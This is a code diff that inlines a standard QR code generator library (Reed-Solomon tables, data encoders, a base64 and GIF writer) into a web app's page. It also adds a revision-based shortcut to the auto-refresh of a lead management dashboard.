+              &&  qrcode.isDark(row, col + 2)
+              &&  qrcode.isDark(row, col + 3)
+              &&  qrcode.isDark(row, col + 4)
+              && !qrcode.isDark(row, col + 5)
+              &&  qrcode.isDark(row, col + 6) ) {
+            lostPoint += 40;
+          }
+        }
+      }
+
+      for (var col = 0; col < moduleCount; col += 1) {
+        for (var row = 0; row < moduleCount - 6; row += 1) {
+          if (qrcode.isDark(row, col)
+              && !qrcode.isDark(row + 1, col)
+              &&  qrcode.isDark(row + 2, col)
+              &&  qrcode.isDark(row + 3, col)
+              &&  qrcode.isDark(row + 4, col)
+              && !qrcode.isDark(row + 5, col)
+              &&  qrcode.isDark(row + 6, col) ) {
+            lostPoint += 40;
+          }
+        }
+      }
+
+      // LEVEL4
+
+      var darkCount = 0;
+
+      for (var col = 0; col < moduleCount; col += 1) {
+        for (var row = 0; row < moduleCount; row += 1) {
+          if (qrcode.isDark(row, col) ) {
+            darkCount += 1;
+          }
+        }
+      }
+
+      var ratio = Math.abs(100 * darkCount / moduleCount / moduleCount - 50) / 5;
+      lostPoint += ratio * 10;
+
+      return lostPoint;
+    };
+
+    return _this;
+  }();
+
+  //---------------------------------------------------------------------
+  // QRMath
+  //---------------------------------------------------------------------
+
+  var QRMath = function() {
+
+    var EXP_TABLE = new Array(256);
+    var LOG_TABLE = new Array(256);
+
+    // initialize tables
+    for (var i = 0; i < 8; i += 1) {
+      EXP_TABLE[i] = 1 << i;
+    }
+    for (var i = 8; i < 256; i += 1) {
+      EXP_TABLE[i] = EXP_TABLE[i - 4]
+        ^ EXP_TABLE[i - 5]
+        ^ EXP_TABLE[i - 6]
+        ^ EXP_TABLE[i - 8];
+    }
+    for (var i = 0; i < 255; i += 1) {
+      LOG_TABLE[EXP_TABLE[i] ] = i;
+    }
+
+    var _this = {};
+
+    _this.glog = function(n) {
+
+      if (n < 1) {
+        throw 'glog(' + n + ')';
+      }
+
+      return LOG_TABLE[n];
+    };
+
+    _this.gexp = function(n) {
+
+      while (n < 0) {
+        n += 255;
+      }
+
+      while (n >= 256) {
+        n -= 255;
+      }
+
+      return EXP_TABLE[n];
+    };
+
+    return _this;
+  }();
+
+  //---------------------------------------------------------------------
+  // qrPolynomial
+  //---------------------------------------------------------------------
+
+  function qrPolynomial(num, shift) {
+
+    if (typeof num.length == 'undefined') {
+      throw num.length + '/' + shift;
+    }
+
+    var _num = function() {
+      var offset = 0;
+      while (offset < num.length && num[offset] == 0) {
+        offset += 1;
+      }
+      var _num = new Array(num.length - offset + shift);
+      for (var i = 0; i < num.length - offset; i += 1) {
+        _num[i] = num[i + offset];
+      }
+      return _num;
+    }();
+
+    var _this = {};
+
+    _this.getAt = function(index) {
+      return _num[index];
+    };
+
+    _this.getLength = function() {
+      return _num.length;
+    };
+
+    _this.multiply = function(e) {
+
+      var num = new Array(_this.getLength() + e.getLength() - 1);
+
+      for (var i = 0; i < _this.getLength(); i += 1) {
+        for (var j = 0; j < e.getLength(); j += 1) {
+          num[i + j] ^= QRMath.gexp(QRMath.glog(_this.getAt(i) ) + QRMath.glog(e.getAt(j) ) );
+        }
+      }
+
+      return qrPolynomial(num, 0);
+    };
+
+    _this.mod = function(e) {
+
+      if (_this.getLength() - e.getLength() < 0) {
+        return _this;
+      }
+
+      var ratio = QRMath.glog(_this.getAt(0) ) - QRMath.glog(e.getAt(0) );
+
+      var num = new Array(_this.getLength() );
+      for (var i = 0; i < _this.getLength(); i += 1) {
+        num[i] = _this.getAt(i);
+      }
+
+      for (var i = 0; i < e.getLength(); i += 1) {
+        num[i] ^= QRMath.gexp(QRMath.glog(e.getAt(i) ) + ratio);
+      }
+
+      // recursive call
+      return qrPolynomial(num, 0).mod(e);
+    };
+
+    return _this;
+  };
+
+  //---------------------------------------------------------------------
+  // QRRSBlock
+  //---------------------------------------------------------------------
+
+  var QRRSBlock = function() {
+
+    var RS_BLOCK_TABLE = [
+
+      // L
+      // M
+      // Q
+      // H
+
+      // 1
+      [1, 26, 19],
+      [1, 26, 16],
+      [1, 26, 13],
+      [1, 26, 9],
+
+      // 2
+      [1, 44, 34],
+      [1, 44, 28],
+      [1, 44, 22],
+      [1, 44, 16],
+
+      // 3
+      [1, 70, 55],
+      [1, 70, 44],
+      [2, 35, 17],
+      [2, 35, 13],
+
+      // 4
+      [1, 100, 80],
+      [2, 50, 32],
+      [2, 50, 24],
+      [4, 25, 9],
+
+      // 5
+      [1, 134, 108],
+      [2, 67, 43],
+      [2, 33, 15, 2, 34, 16],
+      [2, 33, 11, 2, 34, 12],
+
+      // 6
+      [2, 86, 68],
+      [4, 43, 27],
+      [4, 43, 19],
+      [4, 43, 15],
+
+      // 7
+      [2, 98, 78],
+      [4, 49, 31],
+      [2, 32, 14, 4, 33, 15],
+      [4, 39, 13, 1, 40, 14],
+
+      // 8
+      [2, 121, 97],
+      [2, 60, 38, 2, 61, 39],
+      [4, 40, 18, 2, 41, 19],
+      [4, 40, 14, 2, 41, 15],
+
+      // 9
+      [2, 146, 116],
+      [3, 58, 36, 2, 59, 37],
+      [4, 36, 16, 4, 37, 17],
+      [4, 36, 12, 4, 37, 13],
+
+      // 10
+      [2, 86, 68, 2, 87, 69],
+      [4, 69, 43, 1, 70, 44],
+      [6, 43, 19, 2, 44, 20],
+      [6, 43, 15, 2, 44, 16],
+
+      // 11
+      [4, 101, 81],
+      [1, 80, 50, 4, 81, 51],
+      [4, 50, 22, 4, 51, 23],
+      [3, 36, 12, 8, 37, 13],
+
+      // 12
+      [2, 116, 92, 2, 117, 93],
+      [6, 58, 36, 2, 59, 37],
+      [4, 46, 20, 6, 47, 21],
+      [7, 42, 14, 4, 43, 15],
+
+      // 13
+      [4, 133, 107],
+      [8, 59, 37, 1, 60, 38],
+      [8, 44, 20, 4, 45, 21],
+      [12, 33, 11, 4, 34, 12],
+
+      // 14
+      [3, 145, 115, 1, 146, 116],
+      [4, 64, 40, 5, 65, 41],
+      [11, 36, 16, 5, 37, 17],
+      [11, 36, 12, 5, 37, 13],
+
+      // 15
+      [5, 109, 87, 1, 110, 88],
+      [5, 65, 41, 5, 66, 42],
+      [5, 54, 24, 7, 55, 25],
+      [11, 36, 12, 7, 37, 13],
+
+      // 16
+      [5, 122, 98, 1, 123, 99],
+      [7, 73, 45, 3, 74, 46],
+      [15, 43, 19, 2, 44, 20],
+      [3, 45, 15, 13, 46, 16],
+
+      // 17
+      [1, 135, 107, 5, 136, 108],
+      [10, 74, 46, 1, 75, 47],
+      [1, 50, 22, 15, 51, 23],
+      [2, 42, 14, 17, 43, 15],
+
+      // 18
+      [5, 150, 120, 1, 151, 121],
+      [9, 69, 43, 4, 70, 44],
+      [17, 50, 22, 1, 51, 23],
+      [2, 42, 14, 19, 43, 15],
+
+      // 19
+      [3, 141, 113, 4, 142, 114],
+      [3, 70, 44, 11, 71, 45],
+      [17, 47, 21, 4, 48, 22],
+      [9, 39, 13, 16, 40, 14],
+
+      // 20
+      [3, 135, 107, 5, 136, 108],
+      [3, 67, 41, 13, 68, 42],
+      [15, 54, 24, 5, 55, 25],
+      [15, 43, 15, 10, 44, 16],
+
+      // 21
+      [4, 144, 116, 4, 145, 117],
+      [17, 68, 42],
+      [17, 50, 22, 6, 51, 23],
+      [19, 46, 16, 6, 47, 17],
+
+      // 22
+      [2, 139, 111, 7, 140, 112],
+      [17, 74, 46],
+      [7, 54, 24, 16, 55, 25],
+      [34, 37, 13],
+
+      // 23
+      [4, 151, 121, 5, 152, 122],
+      [4, 75, 47, 14, 76, 48],
+      [11, 54, 24, 14, 55, 25],
+      [16, 45, 15, 14, 46, 16],
+
+      // 24
+      [6, 147, 117, 4, 148, 118],
+      [6, 73, 45, 14, 74, 46],
+      [11, 54, 24, 16, 55, 25],
+      [30, 46, 16, 2, 47, 17],
+
+      // 25
+      [8, 132, 106, 4, 133, 107],
+      [8, 75, 47, 13, 76, 48],
+      [7, 54, 24, 22, 55, 25],
+      [22, 45, 15, 13, 46, 16],
+
+      // 26
+      [10, 142, 114, 2, 143, 115],
+      [19, 74, 46, 4, 75, 47],
+      [28, 50, 22, 6, 51, 23],
+      [33, 46, 16, 4, 47, 17],
+
+      // 27
+      [8, 152, 122, 4, 153, 123],
+      [22, 73, 45, 3, 74, 46],
+      [8, 53, 23, 26, 54, 24],
+      [12, 45, 15, 28, 46, 16],
+
+      // 28
+      [3, 147, 117, 10, 148, 118],
+      [3, 73, 45, 23, 74, 46],
+      [4, 54, 24, 31, 55, 25],
+      [11, 45, 15, 31, 46, 16],
+
+      // 29
+      [7, 146, 116, 7, 147, 117],
+      [21, 73, 45, 7, 74, 46],
+      [1, 53, 23, 37, 54, 24],
+      [19, 45, 15, 26, 46, 16],
+
+      // 30
+      [5, 145, 115, 10, 146, 116],
+      [19, 75, 47, 10, 76, 48],
+      [15, 54, 24, 25, 55, 25],
+      [23, 45, 15, 25, 46, 16],
+
+      // 31
+      [13, 145, 115, 3, 146, 116],
+      [2, 74, 46, 29, 75, 47],
+      [42, 54, 24, 1, 55, 25],
+      [23, 45, 15, 28, 46, 16],
+
+      // 32
+      [17, 145, 115],
+      [10, 74, 46, 23, 75, 47],
+      [10, 54, 24, 35, 55, 25],
+      [19, 45, 15, 35, 46, 16],
+
+      // 33
+      [17, 145, 115, 1, 146, 116],
+      [14, 74, 46, 21, 75, 47],
+      [29, 54, 24, 19, 55, 25],
+      [11, 45, 15, 46, 46, 16],
+
+      // 34
+      [13, 145, 115, 6, 146, 116],
+      [14, 74, 46, 23, 75, 47],
+      [44, 54, 24, 7, 55, 25],
+      [59, 46, 16, 1, 47, 17],
+
+      // 35
+      [12, 151, 121, 7, 152, 122],
+      [12, 75, 47, 26, 76, 48],
+      [39, 54, 24, 14, 55, 25],
+      [22, 45, 15, 41, 46, 16],
+
+      // 36
+      [6, 151, 121, 14, 152, 122],
+      [6, 75, 47, 34, 76, 48],
+      [46, 54, 24, 10, 55, 25],
+      [2, 45, 15, 64, 46, 16],
+
+      // 37
+      [17, 152, 122, 4, 153, 123],
+      [29, 74, 46, 14, 75, 47],
+      [49, 54, 24, 10, 55, 25],
+      [24, 45, 15, 46, 46, 16],
+
+      // 38
+      [4, 152, 122, 18, 153, 123],
+      [13, 74, 46, 32, 75, 47],
+      [48, 54, 24, 14, 55, 25],
+      [42, 45, 15, 32, 46, 16],
+
+      // 39
+      [20, 147, 117, 4, 148, 118],
+      [40, 75, 47, 7, 76, 48],
+      [43, 54, 24, 22, 55, 25],
+      [10, 45, 15, 67, 46, 16],
+
+      // 40
+      [19, 148, 118, 6, 149, 119],
+      [18, 75, 47, 31, 76, 48],
+      [34, 54, 24, 34, 55, 25],
+      [20, 45, 15, 61, 46, 16]
+    ];
+
+    var qrRSBlock = function(totalCount, dataCount) {
+      var _this = {};
+      _this.totalCount = totalCount;
+      _this.dataCount = dataCount;
+      return _this;
+    };
+
+    var _this = {};
+
+    var getRsBlockTable = function(typeNumber, errorCorrectionLevel) {
+
+      switch(errorCorrectionLevel) {
+      case QRErrorCorrectionLevel.L :
+        return RS_BLOCK_TABLE[(typeNumber - 1) * 4 + 0];
+      case QRErrorCorrectionLevel.M :
+        return RS_BLOCK_TABLE[(typeNumber - 1) * 4 + 1];
+      case QRErrorCorrectionLevel.Q :
+        return RS_BLOCK_TABLE[(typeNumber - 1) * 4 + 2];
+      case QRErrorCorrectionLevel.H :
+        return RS_BLOCK_TABLE[(typeNumber - 1) * 4 + 3];
+      default :
+        return undefined;
+      }
+    };
+
+    _this.getRSBlocks = function(typeNumber, errorCorrectionLevel) {
+
+      var rsBlock = getRsBlockTable(typeNumber, errorCorrectionLevel);
+
+      if (typeof rsBlock == 'undefined') {
+        throw 'bad rs block @ typeNumber:' + typeNumber +
+            '/errorCorrectionLevel:' + errorCorrectionLevel;
+      }
+
+      var length = rsBlock.length / 3;
+
+      var list = [];
+
+      for (var i = 0; i < length; i += 1) {
+
+        var count = rsBlock[i * 3 + 0];
+        var totalCount = rsBlock[i * 3 + 1];
+        var dataCount = rsBlock[i * 3 + 2];
+
+        for (var j = 0; j < count; j += 1) {
+          list.push(qrRSBlock(totalCount, dataCount) );
+        }
+      }
+
+      return list;
+    };
+
+    return _this;
+  }();
+
+  //---------------------------------------------------------------------
+  // qrBitBuffer
+  //---------------------------------------------------------------------
+
+  var qrBitBuffer = function() {
+
+    var _buffer = [];
+    var _length = 0;
+
+    var _this = {};
+
+    _this.getBuffer = function() {
+      return _buffer;
+    };
+
+    _this.getAt = function(index) {
+      var bufIndex = Math.floor(index / 8);
+      return ( (_buffer[bufIndex] >>> (7 - index % 8) ) & 1) == 1;
+    };
+
+    _this.put = function(num, length) {
+      for (var i = 0; i < length; i += 1) {
+        _this.putBit( ( (num >>> (length - i - 1) ) & 1) == 1);
+      }
+    };
+
+    _this.getLengthInBits = function() {
+      return _length;
+    };
+
+    _this.putBit = function(bit) {
+
+      var bufIndex = Math.floor(_length / 8);
+      if (_buffer.length <= bufIndex) {
+        _buffer.push(0);
+      }
+
+      if (bit) {
+        _buffer[bufIndex] |= (0x80 >>> (_length % 8) );
+      }
+
+      _length += 1;
+    };
+
+    return _this;
+  };
+
+  //---------------------------------------------------------------------
+  // qrNumber
+  //---------------------------------------------------------------------
+
+  var qrNumber = function(data) {
+
+    var _mode = QRMode.MODE_NUMBER;
+    var _data = data;
+
+    var _this = {};
+
+    _this.getMode = function() {
+      return _mode;
+    };
+
+    _this.getLength = function(buffer) {
+      return _data.length;
+    };
+
+    _this.write = function(buffer) {
+
+      var data = _data;
+
+      var i = 0;
+
+      while (i + 2 < data.length) {
+        buffer.put(strToNum(data.substring(i, i + 3) ), 10);
+        i += 3;
+      }
+
+      if (i < data.length) {
+        if (data.length - i == 1) {
+          buffer.put(strToNum(data.substring(i, i + 1) ), 4);
+        } else if (data.length - i == 2) {
+          buffer.put(strToNum(data.substring(i, i + 2) ), 7);
+        }
+      }
+    };
+
+    var strToNum = function(s) {
+      var num = 0;
+      for (var i = 0; i < s.length; i += 1) {
+        num = num * 10 + chatToNum(s.charAt(i) );
+      }
+      return num;
+    };
+
+    var chatToNum = function(c) {
+      if ('0' <= c && c <= '9') {
+        return c.charCodeAt(0) - '0'.charCodeAt(0);
+      }
+      throw 'illegal char :' + c;
+    };
+
+    return _this;
+  };
+
+  //---------------------------------------------------------------------
+  // qrAlphaNum
+  //---------------------------------------------------------------------
+
+  var qrAlphaNum = function(data) {
+
+    var _mode = QRMode.MODE_ALPHA_NUM;
+    var _data = data;
+
+    var _this = {};
+
+    _this.getMode = function() {
+      return _mode;
+    };
+
+    _this.getLength = function(buffer) {
+      return _data.length;
+    };
+
+    _this.write = function(buffer) {
+
+      var s = _data;
+
+      var i = 0;
+
+      while (i + 1 < s.length) {
+        buffer.put(
+          getCode(s.charAt(i) ) * 45 +
+          getCode(s.charAt(i + 1) ), 11);
+        i += 2;
+      }
+
+      if (i < s.length) {
+        buffer.put(getCode(s.charAt(i) ), 6);
+      }
+    };
+
+    var getCode = function(c) {
+
+      if ('0' <= c && c <= '9') {
+        return c.charCodeAt(0) - '0'.charCodeAt(0);
+      } else if ('A' <= c && c <= 'Z') {
+        return c.charCodeAt(0) - 'A'.charCodeAt(0) + 10;
+      } else {
+        switch (c) {
+        case ' ' : return 36;
+        case '$' : return 37;
+        case '%' : return 38;
+        case '*' : return 39;
+        case '+' : return 40;
+        case '-' : return 41;
+        case '.' : return 42;
+        case '/' : return 43;
+        case ':' : return 44;
+        default :
+          throw 'illegal char :' + c;
+        }
+      }
+    };
+
+    return _this;
+  };
+
+  //---------------------------------------------------------------------
+  // qr8BitByte
+  //---------------------------------------------------------------------
+
+  var qr8BitByte = function(data) {
+
+    var _mode = QRMode.MODE_8BIT_BYTE;
+    var _data = data;
+    var _bytes = qrcode.stringToBytes(data);
+
+    var _this = {};
+
+    _this.getMode = function() {
+      return _mode;
+    };
+
+    _this.getLength = function(buffer) {
+      return _bytes.length;
+    };
+
+    _this.write = function(buffer) {
+      for (var i = 0; i < _bytes.length; i += 1) {
+        buffer.put(_bytes[i], 8);
+      }
+    };
+
+    return _this;
+  };
+
+  //---------------------------------------------------------------------
+  // qrKanji
+  //---------------------------------------------------------------------
+
+  var qrKanji = function(data) {
+
+    var _mode = QRMode.MODE_KANJI;
+    var _data = data;
+
+    var stringToBytes = qrcode.stringToBytesFuncs['SJIS'];
+    if (!stringToBytes) {
+      throw 'sjis not supported.';
+    }
+    !function(c, code) {
+      // self test for sjis support.
+      var test = stringToBytes(c);
+      if (test.length != 2 || ( (test[0] << 8) | test[1]) != code) {
+        throw 'sjis not supported.';
+      }
+    }('\u53cb', 0x9746);
+
+    var _bytes = stringToBytes(data);
+
+    var _this = {};
+
+    _this.getMode = function() {
+      return _mode;
+    };
+
+    _this.getLength = function(buffer) {
+      return ~~(_bytes.length / 2);
+    };
+
+    _this.write = function(buffer) {
+
+      var data = _bytes;
+
+      var i = 0;
+
+      while (i + 1 < data.length) {
+
+        var c = ( (0xff & data[i]) << 8) | (0xff & data[i + 1]);
+
+        if (0x8140 <= c && c <= 0x9FFC) {
+          c -= 0x8140;
+        } else if (0xE040 <= c && c <= 0xEBBF) {
+          c -= 0xC140;
+        } else {
+          throw 'illegal char at ' + (i + 1) + '/' + c;
+        }
+
+        c = ( (c >>> 8) & 0xff) * 0xC0 + (c & 0xff);
+
+        buffer.put(c, 13);
+
+        i += 2;
+      }
+
+      if (i < data.length) {
+        throw 'illegal char at ' + (i + 1);
+      }
+    };
+
+    return _this;
+  };
+
+  //=====================================================================
+  // GIF Support etc.
+  //
+
+  //---------------------------------------------------------------------
+  // byteArrayOutputStream
+  //---------------------------------------------------------------------
+
+  var byteArrayOutputStream = function() {
+
+    var _bytes = [];
+
+    var _this = {};
+
+    _this.writeByte = function(b) {
+      _bytes.push(b & 0xff);
+    };
+
+    _this.writeShort = function(i) {
+      _this.writeByte(i);
+      _this.writeByte(i >>> 8);
+    };
+
+    _this.writeBytes = function(b, off, len) {
+      off = off || 0;
+      len = len || b.length;
+      for (var i = 0; i < len; i += 1) {
+        _this.writeByte(b[i + off]);
+      }
+    };
+
+    _this.writeString = function(s) {
+      for (var i = 0; i < s.length; i += 1) {
+        _this.writeByte(s.charCodeAt(i) );
+      }
+    };
+
+    _this.toByteArray = function() {
+      return _bytes;
+    };
+
+    _this.toString = function() {
+      var s = '';
+      s += '[';
+      for (var i = 0; i < _bytes.length; i += 1) {
+        if (i > 0) {
+          s += ',';
+        }
+        s += _bytes[i];
+      }
+      s += ']';
+      return s;
+    };
+
+    return _this;
+  };
+
+  //---------------------------------------------------------------------
+  // base64EncodeOutputStream
+  //---------------------------------------------------------------------
+
+  var base64EncodeOutputStream = function() {
+
+    var _buffer = 0;
+    var _buflen = 0;
+    var _length = 0;
+    var _base64 = '';
+
+    var _this = {};
+
+    var writeEncoded = function(b) {
+      _base64 += String.fromCharCode(encode(b & 0x3f) );
+    };
+
+    var encode = function(n) {
+      if (n < 0) {
+        // error.
+      } else if (n < 26) {
+        return 0x41 + n;
+      } else if (n < 52) {
+        return 0x61 + (n - 26);
+      } else if (n < 62) {
+        return 0x30 + (n - 52);
+      } else if (n == 62) {
+        return 0x2b;
+      } else if (n == 63) {
+        return 0x2f;
+      }
+      throw 'n:' + n;
+    };
+
+    _this.writeByte = function(n) {
+
+      _buffer = (_buffer << 8) | (n & 0xff);
+      _buflen += 8;
+      _length += 1;
+
+      while (_buflen >= 6) {
+        writeEncoded(_buffer >>> (_buflen - 6) );
+        _buflen -= 6;
+      }
+    };
+
+    _this.flush = function() {
+
+      if (_buflen > 0) {
+        writeEncoded(_buffer << (6 - _buflen) );
+        _buffer = 0;
+        _buflen = 0;
+      }
+
+      if (_length % 3 != 0) {
+        // padding
+        var padlen = 3 - _length % 3;
+        for (var i = 0; i < padlen; i += 1) {
+          _base64 += '=';
+        }
+      }
+    };
+
+    _this.toString = function() {
+      return _base64;
+    };
+
+    return _this;
+  };
+
+  //---------------------------------------------------------------------
+  // base64DecodeInputStream
+  //---------------------------------------------------------------------
+
+  var base64DecodeInputStream = function(str) {
+
+    var _str = str;
+    var _pos = 0;
+    var _buffer = 0;
+    var _buflen = 0;
+
+    var _this = {};
+
+    _this.read = function() {
+
+      while (_buflen < 8) {
+
+        if (_pos >= _str.length) {
+          if (_buflen == 0) {
+            return -1;
+          }
+          throw 'unexpected end of file./' + _buflen;
+        }
+
+        var c = _str.charAt(_pos);
+        _pos += 1;
+
+        if (c == '=') {
+          _buflen = 0;
+          return -1;
+        } else if (c.match(/^\s$/) ) {
+          // ignore if whitespace.
+          continue;
+        }
+
+        _buffer = (_buffer << 6) | decode(c.charCodeAt(0) );
+        _buflen += 6;
+      }
+
+      var n = (_buffer >>> (_buflen - 8) ) & 0xff;
+      _buflen -= 8;
+      return n;
+    };
+
+    var decode = function(c) {
+      if (0x41 <= c && c <= 0x5a) {
+        return c - 0x41;
+      } else if (0x61 <= c && c <= 0x7a) {
+        return c - 0x61 + 26;
+      } else if (0x30 <= c && c <= 0x39) {
+        return c - 0x30 + 52;
+      } else if (c == 0x2b) {
+        return 62;
+      } else if (c == 0x2f) {
+        return 63;
+      } else {
+        throw 'c:' + c;
+      }
+    };
+
+    return _this;
+  };
+
+  //---------------------------------------------------------------------
+  // gifImage (B/W)
+  //---------------------------------------------------------------------
+
+  var gifImage = function(width, height) {
+
+    var _width = width;
+    var _height = height;
+    var _data = new Array(width * height);
+
+    var _this = {};
+
+    _this.setPixel = function(x, y, pixel) {
+      _data[y * _width + x] = pixel;
+    };
+
+    _this.write = function(out) {
+
+      //---------------------------------
+      // GIF Signature
+
+      out.writeString('GIF87a');
+
+      //---------------------------------
+      // Screen Descriptor
+
+      out.writeShort(_width);
+      out.writeShort(_height);
+
+      out.writeByte(0x80); // 2bit
+      out.writeByte(0);
+      out.writeByte(0);
+
+      //---------------------------------
+      // Global Color Map
+
+      // black
+      out.writeByte(0x00);
+      out.writeByte(0x00);
+      out.writeByte(0x00);
+
+      // white
+      out.writeByte(0xff);
+      out.writeByte(0xff);
+      out.writeByte(0xff);
+
+      //---------------------------------
+      // Image Descriptor
+
+      out.writeString(',');
+      out.writeShort(0);
+      out.writeShort(0);
+      out.writeShort(_width);
+      out.writeShort(_height);
+      out.writeByte(0);
+
+      //---------------------------------
+      // Local Color Map
+
+      //---------------------------------
+      // Raster Data
+
+      var lzwMinCodeSize = 2;
+      var raster = getLZWRaster(lzwMinCodeSize);
+
+      out.writeByte(lzwMinCodeSize);
+
+      var offset = 0;
+
+      while (raster.length - offset > 255) {
+        out.writeByte(255);
+        out.writeBytes(raster, offset, 255);
+        offset += 255;
+      }
+
+      out.writeByte(raster.length - offset);
+      out.writeBytes(raster, offset, raster.length - offset);
+      out.writeByte(0x00);
+
+      //---------------------------------
+      // GIF Terminator
+      out.writeString(';');
+    };
+
+    var bitOutputStream = function(out) {
+
+      var _out = out;
+      var _bitLength = 0;
+      var _bitBuffer = 0;
+
+      var _this = {};
+
+      _this.write = function(data, length) {
+
+        if ( (data >>> length) != 0) {
+          throw 'length over';
+        }
+
+        while (_bitLength + length >= 8) {
+          _out.writeByte(0xff & ( (data << _bitLength) | _bitBuffer) );
+          length -= (8 - _bitLength);
+          data >>>= (8 - _bitLength);
+          _bitBuffer = 0;
+          _bitLength = 0;
+        }
+
+        _bitBuffer = (data << _bitLength) | _bitBuffer;
+        _bitLength = _bitLength + length;
+      };
+
+      _this.flush = function() {
+        if (_bitLength > 0) {
+          _out.writeByte(_bitBuffer);
+        }
+      };
+
+      return _this;
+    };
+
+    var getLZWRaster = function(lzwMinCodeSize) {
+
+      var clearCode = 1 << lzwMinCodeSize;
+      var endCode = (1 << lzwMinCodeSize) + 1;
+      var bitLength = lzwMinCodeSize + 1;
+
+      // Setup LZWTable
+      var table = lzwTable();
+
+      for (var i = 0; i < clearCode; i += 1) {
+        table.add(String.fromCharCode(i) );
+      }
+      table.add(String.fromCharCode(clearCode) );
+      table.add(String.fromCharCode(endCode) );
+
+      var byteOut = byteArrayOutputStream();
+      var bitOut = bitOutputStream(byteOut);
+
+      // clear code
+      bitOut.write(clearCode, bitLength);
+
+      var dataIndex = 0;
+
+      var s = String.fromCharCode(_data[dataIndex]);
+      dataIndex += 1;
+
+      while (dataIndex < _data.length) {
+
+        var c = String.fromCharCode(_data[dataIndex]);
+        dataIndex += 1;
+
+        if (table.contains(s + c) ) {
+
+          s = s + c;
+
+        } else {
+
+          bitOut.write(table.indexOf(s), bitLength);
+
+          if (table.size() < 0xfff) {
+
+            if (table.size() == (1 << bitLength) ) {
+              bitLength += 1;
+            }
+
+            table.add(s + c);
+          }
+
+          s = c;
+        }
+      }
+
+      bitOut.write(table.indexOf(s), bitLength);
+
+      // end code
+      bitOut.write(endCode, bitLength);
+
+      bitOut.flush();
+
+      return byteOut.toByteArray();
+    };
+
+    var lzwTable = function() {
+
+      var _map = {};
+      var _size = 0;
+
+      var _this = {};
+
+      _this.add = function(key) {
+        if (_this.contains(key) ) {
+          throw 'dup key:' + key;
+        }
+        _map[key] = _size;
+        _size += 1;
+      };
+
+      _this.size = function() {
+        return _size;
+      };
+
+      _this.indexOf = function(key) {
+        return _map[key];
+      };
+
+      _this.contains = function(key) {
+        return typeof _map[key] != 'undefined';
+      };
+
+      return _this;
+    };
+
+    return _this;
+  };
+
+  var createDataURL = function(width, height, getPixel) {
+    var gif = gifImage(width, height);
+    for (var y = 0; y < height; y += 1) {
+      for (var x = 0; x < width; x += 1) {
+        gif.setPixel(x, y, getPixel(x, y) );
+      }
+    }
+
+    var b = byteArrayOutputStream();
+    gif.write(b);
+
+    var base64 = base64EncodeOutputStream();
+    var bytes = b.toByteArray();
+    for (var i = 0; i < bytes.length; i += 1) {
+      base64.writeByte(bytes[i]);
+    }
+    base64.flush();
+
+    return 'data:image/gif;base64,' + base64;
+  };
+
+  //---------------------------------------------------------------------
+  // returns qrcode function.
+
+  return qrcode;
+}();
+
+// multibyte support
+!function() {
+
+  qrcode.stringToBytesFuncs['UTF-8'] = function(s) {
+    // http://stackoverflow.com/questions/18729405/how-to-convert-utf8-string-to-byte-array
+    function toUTF8Array(str) {
+      var utf8 = [];
+      for (var i=0; i < str.length; i++) {
+        var charcode = str.charCodeAt(i);
+        if (charcode < 0x80) utf8.push(charcode);
+        else if (charcode < 0x800) {
+          utf8.push(0xc0 | (charcode >> 6),
+              0x80 | (charcode & 0x3f));
+        }
+        else if (charcode < 0xd800 || charcode >= 0xe000) {
+          utf8.push(0xe0 | (charcode >> 12),
+              0x80 | ((charcode>>6) & 0x3f),
+              0x80 | (charcode & 0x3f));
+        }
+        // surrogate pair
+        else {
+          i++;
+          // UTF-16 encodes 0x10000-0x10FFFF by
+          // subtracting 0x10000 and splitting the
+          // 20 bits of 0x0-0xFFFFF into two halves
+          charcode = 0x10000 + (((charcode & 0x3ff)<<10)
+            | (str.charCodeAt(i) & 0x3ff));
+          utf8.push(0xf0 | (charcode >>18),
+              0x80 | ((charcode>>12) & 0x3f),
+              0x80 | ((charcode>>6) & 0x3f),
+              0x80 | (charcode & 0x3f));
+        }
+      }
+      return utf8;
+    }
+    return toUTF8Array(s);
+  };
+
+}();
+
+(function (factory) {
+  if (typeof define === 'function' && define.amd) {
+      define([], factory);
+  } else if (typeof exports === 'object') {
+      module.exports = factory();
+  }
+}(function () {
+    return qrcode;
+}));
+
+</script>
+<script>
 /* ================= STATE ================= */
 function todayISO(){ return new Date().toISOString().slice(0,10); }
 const STAGES = ['NEW','TL_REVIEW','MANAGER_REVIEW','ACCOUNT_REVIEW','TECH_ASSIGNED',
@@ -1575,7 +3877,7 @@ let role = null, empId = null, empName = null, empRole = null, empTeamType = nul
 let selectedRole = null, selectedEmpId = null, selectedOnlyEmpRole = "";
 let tmTab = 'work';
 let tcView = 'dashboard'; // telecaller sidebar sub-view
-let tcDashSubTab = 'mine'; // telecaller dashboard: 'mine' = My leads, 'pipeline' = Already in the pipeline
+let tcDashSubTab = 'mine'; // telecaller dashboard: 'mine' = My leads, 'pipeline' = Already in the pipeline, 'dues' = Pending balances
 
 /* ================= API (PHP + MySQL) ================= */
 // The per-session CSRF token. Handed out by "login" and by "session" (so it
@@ -1722,7 +4024,15 @@ function handleSessionExpired(){
 // a page refresh, before the very first bootstrap request has finished. Only the second
 // case should ever be treated as "keep waiting", never as "log the person out".
 let lastLoadOk = false;
-async function loadData(){
+// PERFORMANCE (review fix #5): the 12-second auto-refresh used to download the whole
+// dataset every time (25 MB at 8,000 clients). The server now numbers every change; the
+// background refresh sends the number it has, and gets {unchanged:true} back - a few bytes -
+// when nothing changed. A full reload still happens at least every 2 minutes, and every
+// other caller (after an action, on login, on page load) always loads in full.
+let lastDataRev = null, lastDataRevTok = "", lastFullLoadAt = 0;
+const FULL_RELOAD_MS = 120000;
+async function loadData(opts){
+  const allowSkip = !!(opts && opts.allowSkip);
   // A page refresh fires this immediately, before the server may be ready to answer, or
   // over a slightly slower connection than usual - a single failed attempt here used to
   // look identical to "this session/client is invalid" to anything that read `clients`
@@ -1732,7 +4042,18 @@ async function loadData(){
   const attempts = 3;
   for(let i=0; i<attempts; i++){
     try{
-      const out = await api("bootstrap");
+      const tok = getTabToken();
+      const canSkip = allowSkip && lastDataRev !== null && lastDataRevTok === tok
+                      && (Date.now() - lastFullLoadAt) < FULL_RELOAD_MS;
+      const out = await api("bootstrap", canSkip ? {sinceRev: lastDataRev} : {});
+      if(out.unchanged){
+        $("memWarn").style.display = "none";
+        lastLoadOk = true;
+        return false;
+      }
+      lastDataRev = (out.dataRev === undefined) ? null : out.dataRev;
+      lastDataRevTok = tok;
+      lastFullLoadAt = Date.now();
       clients = out.clients || [];
       employees = out.employees || [];
       settings = Object.assign(settings, out.settings || {});
